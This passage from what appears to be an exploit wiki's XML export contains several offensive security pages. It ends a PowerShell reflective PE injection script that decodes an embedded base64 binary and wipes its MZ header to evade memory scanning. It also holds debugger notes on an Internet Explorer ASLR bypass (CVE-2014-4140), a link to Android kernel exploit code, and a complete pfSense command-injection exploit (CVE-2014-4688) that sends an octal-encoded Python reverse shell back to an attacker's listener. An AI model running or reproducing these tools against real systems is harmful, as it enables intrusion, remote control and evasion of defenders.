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9ij6KP4owikGKQopDikSKRYpGikeKSIpJikqKS4pMik2KTopPikCKUYpSilOKVIpVilaKV4pYilmKWopbilyKXYpeil+KUIphimKKY4pkimWKZopnimiKaYpqimuKbIptim6Kb4pginGKcopzinSKdYp2ineKeIp5inqKe4p8in2Kfop/inCKgYqCioOKhIqFioaKh4qIiomKioqLioyKjYqOio+KgIqRipKKk4qUipWKloqXipiKmYqaipuKnIqdip6Kn4qQiqGKooqjiqSKpYqmiqeKqIqpiqqKq4qsiq2KroqviqCKsYqyirOKtIq1iraKt4q4irmKuoq7iryKvYq+ir+KsIrBisKKw4rEisWKxorHisiKyYrKisuKzIrNis6Kz4rAitGK0orTitSK1YrWiteK2IrZitqK24rcit2K3orfitCK4YriiuOK5IrliuaK54roiumK6orriuyK7Yruiu+K4IrxivKK84r0CvUK9gr3CvgK+Qr6CvsK/Ar9Cv4K/wrwAgAQC4AQAAAKAQoCCgMKBAoFCgYKBwoICgkKCgoLCgwKDQoOCg8KAAoRChIKEwoUChUKFgoXChgKGQoaChsKHAodCh4KHwoQCiEKIgojCiQKJQomCicKKAopCioKKwosCi0KLgovCiAKMQoyCjMKNAo1CjYKNwo4CjkKOgo7CjwKPQo+Cj8KMApBCkIKQwpECkUKRgpHCkgKSQpKCksKTApNCk4KTwpAClEKUgpTClQKVQpWClcKWApZCloKWwpcCl0KXgpfClAKYQpiCmMKZAplCmYKZwpoCmkKagprCmwKbQpuCm8KYApxCnIKcwp0CnUKdgp3CngKeQp6CnsKfAp9Cn4KfwpwCoEKggqDCoQKhQqGCocKiAqJCooKiwqMCo0KjgqPCoAKkQqSCpMKlAqVCpYKlwqYCpkKmgqbCpwKnQqeCp8KkAqhCqIKowqkCqUKpgqnCqgKqQqqCqsKrAqtCq4KrwqgCrEKsgqzCrQKtQq2CrcKuAq5CroKuwq8Cr0Kvgq/CrAKwQrCCsMKxArFCsYKxwrICskKygrLCswKzQrOCs8KwArRCtIK0wrUCtUK1grXCtAEABAAwAAAAQpNiqAGABAOwAAAAYoCCgoKGwoQCrIKsoqzCrOKtAq0irUKtYq2CraKtwq3irgKuIq5CrmKugq6irsKu4q8CryKvQq9ir4Kvoq/Cr+KsArAisEKwYrCCsKKwwrDisQKxIrFCsWKxgrGiscKyArIiskKyYrKCsqKywrLiswKzIrNCs2KzgrOis8Kz4rACtCK0QrRitIK0orTCtOK1ArUitUK1YrWCtaK1wrXitgK2IrZCtmK2graitsK24rcCtyK3Qrdit4K0orkiuaK6Irqiu4K74rgCvCK8Qr1CvWK9gr2ivcK94r4CviK+Qr5ivAAAAcAEANAAAAOCh6KHwofihAKIIohCiGKIgoiiiOKJAokiiUKJYomCiaKJwooCiiKKQopiiAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'

		[Byte[]]$PEBytes = [System.Convert]::FromBase64String($InputString);
	#}
	&lt;#
	else
	{
		$WebClient = New-Object System.Net.WebClient
		
		[Byte[]]$PEBytes = $WebClient.DownloadData($PEUrl)
	}
	#&gt;
	#Verify the image is a valid PE file
	$e_magic = ($PEBytes[0..1] | % {[Char] $_}) -join ''

    if ($e_magic -ne 'MZ')
    {
        throw 'PE is not a valid PE file.'
    }

    # Remove 'MZ' from the PE file so that it cannot be detected by .imgscan in WinDbg
	# TODO: Investigate how much of the header can be destroyed, I'd imagine most of it can be.
    $PEBytes[0] = 0
    $PEBytes[1] = 0
	
	#Add a "program name" to exeargs, just so the string looks as normal as possible (real args start indexing at 1)
	if ($ExeArgs -ne $null -and $ExeArgs -ne '')
	{
		$ExeArgs = "ReflectiveExe $ExeArgs"
	}
	else
	{
		$ExeArgs = "ReflectiveExe"
	}

	if ($ComputerName -eq $null -or $ComputerName -imatch "^\s*$")
	{
		Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes, $FuncReturnType, $ProcId, $ProcName,$ForceASLR)
	}
	else
	{
		Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes, $FuncReturnType, $ProcId, $ProcName,$ForceASLR) -ComputerName $ComputerName
	}
}

Main
}
Invoke-ReflectivePEInjection

&lt;/pre&gt;</text>
      <sha1>arzn8wgixml2emzlt3o7pcoyy2iwkoh</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2014-4140 Internet Explorer ASLR繞過漏洞</title>
    <ns>0</ns>
    <id>826</id>
    <revision>
      <id>1083</id>
      <timestamp>2021-04-07T03:41:13Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==INFO== Microsoft Internet Explorer 8 through 11 allows remote attackers to bypass the ASLR protection mechanism via a crafted web site, aka "Internet Explorer ASLR Bypass Vu..."</comment>
      <origin>1083</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="11862" sha1="b9s0nrovntfvcor4t3cwylbt22craf0" xml:space="preserve">==INFO==
Microsoft Internet Explorer 8 through 11 allows remote attackers to bypass the ASLR protection mechanism via a crafted web site, aka "Internet Explorer ASLR Bypass Vulnerability."

==Note==
&lt;pre&gt;
Some rough notes

0:007&gt; u
MSHTML!CHtmRootParseCtx::AddText+0x104:
6efff0a5 8b8e88000000    mov     ecx,dword ptr [esi+88h]
6efff0ab 898d70ffffff    mov     dword ptr [ebp-90h],ecx
6efff0b1 8945ac          mov     dword ptr [ebp-54h],eax
6efff0b4 8b5118          mov     edx,dword ptr [ecx+18h]
6efff0b7 8bca            mov     ecx,edx
6efff0b9 83e103          and     ecx,3
6efff0bc 83f902          cmp     ecx,2
6efff0bf 0f8531050000    jne     MSHTML!CHtmRootParseCtx::AddText+0x2d7 (6efff5f6)
0:007&gt; g
Breakpoint 2 hit
eax=0dc8aff0 ebx=00000006 ecx=0600005a edx=0e842fd0 esi=0eb34f18 edi=00000006
eip=6efff0a5 esp=09bcbdd0 ebp=09bcbe84 iopl=0         nv up ei pl nz na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000206
MSHTML!CHtmRootParseCtx::AddText+0x104:
6efff0a5 8b8e88000000    mov     ecx,dword ptr [esi+88h] ds:002b:0eb34fa0=0e842fd0
0:007&gt; g
Breakpoint 2 hit
eax=0eb2c800 ebx=00000001 ecx=0600005b edx=0e842fd0 esi=0eb34f18 edi=00000001
eip=6efff0a5 esp=09bcbdd8 ebp=09bcbe8c iopl=0         nv up ei pl nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202
MSHTML!CHtmRootParseCtx::AddText+0x104:
6efff0a5 8b8e88000000    mov     ecx,dword ptr [esi+88h] ds:002b:0eb34fa0=0e842fd0
0:007&gt; g
Breakpoint 2 hit
eax=0600005c ebx=0e842fd0 ecx=00000001 edx=09bcbcd6 esi=0eb34f18 edi=00000000
eip=6f01ac7a esp=09bcbb78 ebp=09bcbc2c iopl=0         nv up ei pl nz na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000206
MSHTML!CHtmRootParseCtx::AddText+0x969:
6f01ac7a 8b8688000000    mov     eax,dword ptr [esi+88h] ds:002b:0eb34fa0=0e842fd0
0:007&gt; g
Breakpoint 1 hit
eax=00000001 ebx=00000000 ecx=77c338aa edx=03c31078 esi=0e9def40 edi=0e842fd0
eip=6ef7c11c esp=09bcc698 ebp=09bcc6a0 iopl=0         nv up ei pl nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202
MSHTML!CTreeDataPos::SetTextData+0x1c:
6ef7c11c 5f              pop     edi
0:007&gt; dd e842ff0
0e842ff0  0e9def40 0600005c 00000000 d0d0d0d0
0e843000  ???????? ???????? ???????? ????????
0e843010  ???????? ???????? ???????? ????????
0e843020  ???????? ???????? ???????? ????????
0e843030  ???????? ???????? ???????? ????????
0e843040  ???????? ???????? ???????? ????????
0e843050  ???????? ???????? ???????? ????????
0e843060  ???????? ???????? ???????? ????????
0:007&gt; g
SetContext failed, 0x80070005
MachineInfo::SetContext failed - Thread: 0C74BC20  Handle: 2f8  Id: b58 - Error == 0x80070005
SetContext failed, 0x80070005
MachineInfo::SetContext failed - Thread: 0C74B520  Handle: 810  Id: 7b0 - Error == 0x80070005
SetContext failed, 0x80070005
MachineInfo::SetContext failed - Thread: 0C74B420  Handle: 8c8  Id: 604 - Error == 0x80070005
(a04.9b8): Unknown exception - code 80010108 (first chance)
(a04.8f4): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=0000000a ebx=0bd78ffa ecx=0e9deffe edx=00000000 esi=0bd78fb2 edi=0e9df000
eip=6f5a1f54 esp=09bcc6bc ebp=09bcc6d0 iopl=0         nv up ei ng nz ac po cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010293
MSHTML!CTreeDataPos::GetPlainText+0x536828:
6f5a1f54 66394102        cmp     word ptr [ecx+2],ax      ds:002b:0e9df000=????
0:007&gt; dd e842ff0
0e842ff0  0e9def40 0600005c 00000000 d0d0d0d0
0e843000  ???????? ???????? ???????? ????????
0e843010  ???????? ???????? ???????? ????????
0e843020  ???????? ???????? ???????? ????????
0e843030  ???????? ???????? ???????? ????????
0e843040  ???????? ???????? ???????? ????????
0e843050  ???????? ???????? ???????? ????????
0e843060  ???????? ???????? ???????? ????????
0:007&gt; dd poi(e842ff0)
0e9def40  00000001 0000005c 0062003c 00730061
0e9def50  00660065 006e006f 00200074 00740073
0e9def60  006c0079 003d0065 00640022 00730069
0e9def70  006c0070 00790061 0066003a 006f006c
0e9def80  00740061 0020003a 00690072 00680067
0e9def90  003b0074 006f0062 00740074 006d006f
0e9defa0  0020003a 0031002d 00650030 003b006d
0e9defb0  006d0065 00740070 002d0079 00650063
0:007&gt; u mshtml + 0x2af33f
MSHTML!CHtmRootParseCtx::AddText+0x460:
6efff33f 8bf8            mov     edi,eax
6efff341 85ff            test    edi,edi
6efff343 0f849e805500    je      MSHTML!CHtmRootParseCtx::AddText+0x558452 (6f5573e7)
6efff349 8b4718          mov     eax,dword ptr [edi+18h]
6efff34c 810fc0000000    or      dword ptr [edi],0C0h
6efff352 83e037          and     eax,37h
6efff355 83c840          or      eax,40h
6efff358 c7471c00000000  mov     dword ptr [edi+1Ch],0


MSHTML!CTreeDataPos::GetPlainText+0x536828:
709b1f54 66394102        cmp     word ptr [ecx+2],ax      ds:002b:0ffa0000=????

bp mshtml + 0x31b799
pointer to CTextArea dd poi(poi(poi(ecx+1c)+0c+14)+20)=5c
dds poi(poi(poi(9b3c58c)+14)+20)

0:007&gt; k
ChildEBP RetAddr  
096fc4a8 6e17a317 MSHTML!CTreeDataPos::GetPlainText
096fc4dc 6e08f968 MSHTML!CElement::GetPlainTextInternal+0xda
096fc514 6e18fea7 MSHTML!CElement::GetPlainTextInScope+0x41
096fc53c 6e18fe47 MSHTML!CRichtext::Notify+0x81
096fc550 6ddd1a09 MSHTML!CTextArea::Notify+0x12
096fc5d0 6df6be6f MSHTML!CHtmParseBase::Execute+0xee
096fc6f4 6dde7ec9 MSHTML!CHtmPost::Exec+0x474
096fc70c 6dde7e4d MSHTML!CHtmPost::Run+0x1c
096fc72c 6dde8daf MSHTML!PostManExecute+0x61
096fc740 6dde8d10 MSHTML!PostManResume+0x7b
096fc770 6ddf2e3c MSHTML!CHtmPost::OnDwnChanCallback+0x38
096fc780 6dd40d01 MSHTML!CDwnChan::OnMethodCall+0x19
096fc7c4 6dd29a5a MSHTML!GlobalWndOnMethodCall+0x12c
096fc810 75e362fa MSHTML!GlobalWndProc+0x115
096fc83c 75e36d3a user32!InternalCallWinProc+0x23
096fc8b4 75e377c4 user32!UserCallWinProcCheckWow+0x109
096fc914 75e3788a user32!DispatchMessageWorker+0x3bc
096fc924 7148bdfc user32!DispatchMessageW+0xf
096ffae4 715d602f IEFRAME!CTabWindow::_TabWindowThreadProc+0x445
096ffb9c 7649d14c IEFRAME!LCIETab_ThreadProc+0x31c
096ffbac 72ef31cc iertutil!_IsoThreadProc_WrapperToReleaseScope+0xe
096ffbd8 7696338a IEShims!NS_CreateThread::DesktopIE_ThreadProc+0x71
096ffbe4 77c39f72 kernel32!BaseThreadInitThunk+0xe
096ffc24 77c39f45 ntdll!__RtlUserThreadStart+0x70
096ffc3c 00000000 ntdll!_RtlUserThreadStart+0x1b

edi comes from...
0:007&gt; !heap -p -a edi
    address 0e714fd0 found in
    _DPH_HEAP_ROOT @ 2c61000
    in busy allocation (  DPH_HEAP_BLOCK:         UserAddr         UserSize -         VirtAddr         VirtSize)
                                 e611340:          e714fd0               2c -          e714000             2000
    72a78e89 verifier!AVrfDebugPageHeapAllocate+0x00000229
    77cd0d96 ntdll!RtlDebugAllocateHeap+0x00000030
    77c8af0d ntdll!RtlpAllocateHeap+0x000000c4
    77c33cfe ntdll!RtlAllocateHeap+0x0000023a
    6e5af33f MSHTML!CHtmRootParseCtx::AddText+0x00000460
    6e5aef8b MSHTML!CHtmRootParseCtxRouter::AddText+0x0000001d
    6e5333f0 MSHTML!CInsertionMode::HandleCharacterToken+0x0000005b
    6e5347b6 MSHTML!CHtml5Tokenizer::RCDATALessThanSign_StateHandler+0x000000c7
    6e5b4455 MSHTML!CHtml5Tokenizer::ParseBuffer+0x0000023c
    6e5b4be7 MSHTML!CHtml5Parse::ParseToken+0x0000010e
    6e5ac7c9 MSHTML!CHtmPost::ProcessTokens+0x000001d2
    6e5abbbf MSHTML!CHtmPost::Exec+0x0000017f
    6e427ec9 MSHTML!CHtmPost::Run+0x0000001c
    6e427e4d MSHTML!PostManExecute+0x00000061
    6e428daf MSHTML!PostManResume+0x0000007b
    6e432e3c MSHTML!CDwnChan::OnMethodCall+0x00000019
    6e380d01 MSHTML!GlobalWndOnMethodCall+0x0000012c
    6e369a5a MSHTML!GlobalWndProc+0x00000115
    75e362fa user32!InternalCallWinProc+0x00000023
    75e36d3a user32!UserCallWinProcCheckWow+0x00000109
    75e377c4 user32!DispatchMessageWorker+0x000003bc
    75e3788a user32!DispatchMessageW+0x0000000f
    7148bdfc IEFRAME!CTabWindow::_TabWindowThreadProc+0x00000445
    715d602f IEFRAME!LCIETab_ThreadProc+0x0000031c
    7649d14c iertutil!_IsoThreadProc_WrapperToReleaseScope+0x0000000e
    72ef31cc IEShims!NS_CreateThread::DesktopIE_ThreadProc+0x00000071
    7696338a kernel32!BaseThreadInitThunk+0x0000000e
    77c39f72 ntdll!__RtlUserThreadStart+0x00000070
    77c39f45 ntdll!_RtlUserThreadStart+0x0000001b
&lt;/pre&gt;


==textarea_OOB_array_read_notes==
&lt;pre&gt;
MSHTML!CTreeDataPos::GetPlainText+0x536828:
709b1f54 66394102        cmp     word ptr [ecx+2],ax      ds:002b:0ffa0000=????

bp mshtml + 0x31b799
pointer to CTextArea dd poi(poi(poi(ecx+1c)+0c+14)+20)=5c
dds poi(poi(poi(9b3c58c)+14)+20)

0:007&gt; k
ChildEBP RetAddr  
096fc4a8 6e17a317 MSHTML!CTreeDataPos::GetPlainText
096fc4dc 6e08f968 MSHTML!CElement::GetPlainTextInternal+0xda
096fc514 6e18fea7 MSHTML!CElement::GetPlainTextInScope+0x41
096fc53c 6e18fe47 MSHTML!CRichtext::Notify+0x81
096fc550 6ddd1a09 MSHTML!CTextArea::Notify+0x12
096fc5d0 6df6be6f MSHTML!CHtmParseBase::Execute+0xee
096fc6f4 6dde7ec9 MSHTML!CHtmPost::Exec+0x474
096fc70c 6dde7e4d MSHTML!CHtmPost::Run+0x1c
096fc72c 6dde8daf MSHTML!PostManExecute+0x61
096fc740 6dde8d10 MSHTML!PostManResume+0x7b
096fc770 6ddf2e3c MSHTML!CHtmPost::OnDwnChanCallback+0x38
096fc780 6dd40d01 MSHTML!CDwnChan::OnMethodCall+0x19
096fc7c4 6dd29a5a MSHTML!GlobalWndOnMethodCall+0x12c
096fc810 75e362fa MSHTML!GlobalWndProc+0x115
096fc83c 75e36d3a user32!InternalCallWinProc+0x23
096fc8b4 75e377c4 user32!UserCallWinProcCheckWow+0x109
096fc914 75e3788a user32!DispatchMessageWorker+0x3bc
096fc924 7148bdfc user32!DispatchMessageW+0xf
096ffae4 715d602f IEFRAME!CTabWindow::_TabWindowThreadProc+0x445
096ffb9c 7649d14c IEFRAME!LCIETab_ThreadProc+0x31c
096ffbac 72ef31cc iertutil!_IsoThreadProc_WrapperToReleaseScope+0xe
096ffbd8 7696338a IEShims!NS_CreateThread::DesktopIE_ThreadProc+0x71
096ffbe4 77c39f72 kernel32!BaseThreadInitThunk+0xe
096ffc24 77c39f45 ntdll!__RtlUserThreadStart+0x70
096ffc3c 00000000 ntdll!_RtlUserThreadStart+0x1b

edi comes from...
0:007&gt; !heap -p -a edi
    address 0e714fd0 found in
    _DPH_HEAP_ROOT @ 2c61000
    in busy allocation (  DPH_HEAP_BLOCK:         UserAddr         UserSize -         VirtAddr         VirtSize)
                                 e611340:          e714fd0               2c -          e714000             2000
    72a78e89 verifier!AVrfDebugPageHeapAllocate+0x00000229
    77cd0d96 ntdll!RtlDebugAllocateHeap+0x00000030
    77c8af0d ntdll!RtlpAllocateHeap+0x000000c4
    77c33cfe ntdll!RtlAllocateHeap+0x0000023a
    6e5af33f MSHTML!CHtmRootParseCtx::AddText+0x00000460
    6e5aef8b MSHTML!CHtmRootParseCtxRouter::AddText+0x0000001d
    6e5333f0 MSHTML!CInsertionMode::HandleCharacterToken+0x0000005b
    6e5347b6 MSHTML!CHtml5Tokenizer::RCDATALessThanSign_StateHandler+0x000000c7
    6e5b4455 MSHTML!CHtml5Tokenizer::ParseBuffer+0x0000023c
    6e5b4be7 MSHTML!CHtml5Parse::ParseToken+0x0000010e
    6e5ac7c9 MSHTML!CHtmPost::ProcessTokens+0x000001d2
    6e5abbbf MSHTML!CHtmPost::Exec+0x0000017f
    6e427ec9 MSHTML!CHtmPost::Run+0x0000001c
    6e427e4d MSHTML!PostManExecute+0x00000061
    6e428daf MSHTML!PostManResume+0x0000007b
    6e432e3c MSHTML!CDwnChan::OnMethodCall+0x00000019
    6e380d01 MSHTML!GlobalWndOnMethodCall+0x0000012c
    6e369a5a MSHTML!GlobalWndProc+0x00000115
    75e362fa user32!InternalCallWinProc+0x00000023
    75e36d3a user32!UserCallWinProcCheckWow+0x00000109
    75e377c4 user32!DispatchMessageWorker+0x000003bc
    75e3788a user32!DispatchMessageW+0x0000000f
    7148bdfc IEFRAME!CTabWindow::_TabWindowThreadProc+0x00000445
    715d602f IEFRAME!LCIETab_ThreadProc+0x0000031c
    7649d14c iertutil!_IsoThreadProc_WrapperToReleaseScope+0x0000000e
    72ef31cc IEShims!NS_CreateThread::DesktopIE_ThreadProc+0x00000071
    7696338a kernel32!BaseThreadInitThunk+0x0000000e
    77c39f72 ntdll!__RtlUserThreadStart+0x00000070
    77c39f45 ntdll!_RtlUserThreadStart+0x0000001b
&lt;/pre&gt;</text>
      <sha1>b9s0nrovntfvcor4t3cwylbt22craf0</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2014-4322 Linux kernel 3.x 拒絕服務漏洞</title>
    <ns>0</ns>
    <id>838</id>
    <revision>
      <id>1097</id>
      <timestamp>2021-04-07T07:58:11Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==INFO== poc code works on Nexus Android 4.4/5.0   ==POC== https://github.com/JustYoomoon/Exploit/blob/main/CVE-2014-4322.zip"</comment>
      <origin>1097</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="125" sha1="0xi8zq8xmp4f159e4s18eirli35m5an" xml:space="preserve">==INFO==
poc code works on Nexus Android 4.4/5.0


==POC==
https://github.com/JustYoomoon/Exploit/blob/main/CVE-2014-4322.zip</text>
      <sha1>0xi8zq8xmp4f159e4s18eirli35m5an</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2014-4688 pfSense before 2.1.4任意命令執行漏洞</title>
    <ns>0</ns>
    <id>839</id>
    <revision>
      <id>1098</id>
      <timestamp>2021-04-07T08:01:21Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==INFO== pfSense before 2.1.4 allows remote authenticated users to execute arbitrary commands via (1) the hostname value to diag_dns.php in a Create Alias action, (2) the smar..."</comment>
      <origin>1098</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="3908" sha1="at4bikwzlh3mqgz4wz81yainko1ypwv" xml:space="preserve">==INFO==
pfSense before 2.1.4 allows remote authenticated users to execute arbitrary commands via (1) the hostname value to diag_dns.php in a Create Alias action, (2) the smartmonemail value to diag_smart.php, or (3) the database value to status_rrd_graph_img.php.

==Usage==
&lt;pre&gt;
python3 pfsense.py --rhost 10.10.10.60 --lhost 10.10.14.2 --lport 9999 --username rohit --password pfsense
&lt;/pre&gt;


==pfsense.py==
&lt;pre&gt;

#!/usr/bin/env python3

# Exploit Title: pfSense &lt;= 2.1.3 status_rrd_graph_img.php Command Injection.
# Date: 2018-01-12
# Exploit Author: absolomb
# Vendor Homepage: https://www.pfsense.org/
# Software Link: https://atxfiles.pfsense.org/mirror/downloads/old/
# Version: &lt;=2.1.3
# Tested on: FreeBSD 8.3-RELEASE-p16
# CVE : CVE-2014-4688

import argparse
import requests
import urllib
import urllib3
import collections

'''
pfSense &lt;= 2.1.3 status_rrd_graph_img.php Command Injection.
This script will return a reverse shell on specified listener address and port.
Ensure you have started a listener to catch the shell before running!
'''

parser = argparse.ArgumentParser()
parser.add_argument("--rhost", help = "Remote Host")
parser.add_argument('--lhost', help = 'Local Host listener')
parser.add_argument('--lport', help = 'Local Port listener')
parser.add_argument("--username", help = "pfsense Username")
parser.add_argument("--password", help = "pfsense Password")
args = parser.parse_args()

rhost = args.rhost
lhost = args.lhost
lport = args.lport
username = args.username
password = args.password


# command to be converted into octal
command = """
python -c 'import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("%s",%s));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"]);'
""" % (lhost, lport)


payload = ""

# encode payload in octal
for char in command:
	payload += ("\\" + oct(ord(char)).lstrip("0o"))

login_url = 'https://' + rhost + '/index.php'
exploit_url = "https://" + rhost + "/status_rrd_graph_img.php?database=queues;"+"printf+" + "'" + payload + "'|sh"

headers = [
	('User-Agent','Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0'),
	('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'),
	('Accept-Language', 'en-US,en;q=0.5'),
	('Referer',login_url),
	('Connection', 'close'),
	('Upgrade-Insecure-Requests', '1'),
	('Content-Type', 'application/x-www-form-urlencoded')
]

# probably not necessary but did it anyways
headers = collections.OrderedDict(headers)

# Disable insecure https connection warning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

client = requests.session()

# try to get the login page and grab the csrf token
try:
	login_page = client.get(login_url, verify=False)

	index = login_page.text.find("csrfMagicToken")
	csrf_token = login_page.text[index:index+128].split('"')[-1]

except:
	print("Could not connect to host!")
	exit()

# format login variables and data
if csrf_token:
	print("CSRF token obtained")
	login_data = [('__csrf_magic',csrf_token), ('usernamefld',username), ('passwordfld',password), ('login','Login') ]
	login_data = collections.OrderedDict(login_data)
	encoded_data = urllib.parse.urlencode(login_data)

# POST login request with data, cookies and header
	login_request = client.post(login_url, data=encoded_data, cookies=client.cookies, headers=headers)
else:
	print("No CSRF token!")
	exit()

if login_request.status_code == 200:
		print("Running exploit...")
# make GET request to vulnerable url with payload. Probably a better way to do this but if the request times out then most likely you have caught the shell
		try:
			exploit_request = client.get(exploit_url, cookies=client.cookies, headers=headers, timeout=5)
			if exploit_request.status_code:
				print("Error running exploit")
		except:
			print("Exploit completed")
            

&lt;/pre&gt;</text>
      <sha1>at4bikwzlh3mqgz4wz81yainko1ypwv</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2014-4699 Linux kernel before 3.15.4拒絕服務漏洞</title>
    <ns>0</ns>
    <id>840</id>
    <revision>
      <id>1099</id>
      <timestamp>2021-04-07T08:03:29Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==INFO== The Linux kernel before 3.15.4 on Intel processors does not properly restrict use of a non-canonical value for the saved RIP address in the case of a system call that..."</comment>
      <origin>1099</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="3832" sha1="7ub7s3hid6xw8s2h22zd359pgbwpxlk" xml:space="preserve">==INFO==
